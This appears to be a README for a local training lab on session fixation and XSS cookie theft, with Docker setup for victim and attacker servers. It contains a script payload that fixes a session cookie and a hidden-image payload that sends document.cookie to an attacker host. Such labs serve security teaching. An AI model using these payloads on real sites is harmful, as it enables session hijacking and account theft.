# Example

Check for session fixation
Login with: `admin` `istrator`

enter

`<script>document.cookie='connect.sid=12345;path=/'</script>`

# Docker

## Copose

`docker-compose` up in `docker` folder

### Single Docker Builds

#### Victim Server

goto `docker/victimserver` folder

`docker build -t sessionvictimserver .`
`docker run -ti --rm -p 127.0.0.1:3000:3000 sessionvictimserver`

visit [http://localhost:3000/sessionxss/login](http://localhost:3000/sessionxss/login)

#### Attacker Server

goto `docker/attackerserver` folder

Python + SimpleHTTPServer

## Payloads

### Session Hijacking / get Cookies

#### By Hidden Image

```
<script>img = document.createElement("img");img.src = "http://localhost/"+document.cookie;img.style.display = "none";x = document.getElementsByTagName("BODY")[0];x.appendChild(img);</script>
```

# Code 

goto `docker/victimserver/files`

## Installation

npm install --save express@4.16.2 pug@2.0.0-rc.4 body-parser@1.18.2 multer@1.3.0 sqlite3@3.1.13 cookie-parser@1.4.3 express-session@1.15.6
npm install nodemon

## Execution

run: `nodemon index.js`
goto: http://localhost:3000/sessionxss/login